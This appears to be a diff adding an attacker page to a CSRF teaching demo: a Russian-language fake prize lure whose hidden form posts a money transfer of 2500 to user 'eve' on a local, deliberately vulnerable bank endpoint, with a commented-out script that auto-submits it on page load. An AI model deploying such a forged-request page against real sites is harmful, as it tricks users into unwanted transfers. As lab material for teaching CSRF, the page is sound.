@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Сайт злоумышленника</title>
+    <style>
+        body { font-family: sans-serif; background: #450a0a; color: #fef2f2; padding: 40px; text-align: center; }
+        .card { background: #7f1d1d; padding: 30px; border-radius: 12px; max-width: 500px; margin: auto; }
+        h2 { color: #fca5a5; }
+        .loot { font-size: 1.5rem; font-weight: bold; color: #facc15; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h2>🎁 Вы выиграли супер-приз!</h2>
+        <p>Поздравляем, пользователь <span class="loot">{{ victim }}</span>! Нажмите на кнопку ниже, чтобы забрать свой бонус!</p>
+
+        <!-- СКРЫТАЯ ИЛИ АВТООТПРАВЛЯЕМАЯ ФОРМА АТАКИ -->
+        <!-- Она отправляет запрос на УЯЗВИМЫЙ эндпоинт банка в обход жертвы -->
+        <form action="http://127.0.0.1:5000/transfer_vulnerable" method="POST">
+            <input type="hidden" name="to_user" value="eve">
+            <input type="hidden" name="amount" value="2500">
+            <button type="submit" style="background: #dc2626; color: white; padding: 15px 25px; border:none; border-radius:8px; font-size:1.1rem; cursor:pointer;">
+                Забрать бонус 2500 тг! 🚀
+            </button>
+        </form>
+
+        <br>
+        <a href="/" style="color: #fca5a5;">⬅️ Вернуться в банк</a>
+    </div>
+
+    <!-- Опционально: автоматическая отправка формы без клика (реальный CSRF) -->
+    <!-- 
+    <script>
+        window.onload = function() {
+            document.forms[0].submit();
+        }
+    </script>
+    -->
+</body>
+</html>
